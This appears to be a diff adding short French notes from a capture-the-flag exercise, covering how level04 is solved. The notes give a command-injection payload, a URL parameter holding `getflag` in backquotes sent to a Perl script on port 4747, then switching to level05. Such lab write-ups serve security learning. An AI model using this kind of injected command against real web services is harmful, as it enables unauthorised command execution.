@@ -1,0 +1,8 @@
+dans la VM:
+./level04.pl
+
+dans google :
+[IP de la VM]:4747/?x=`getflag`
+(les back quote execute la commande)
+
+su level05
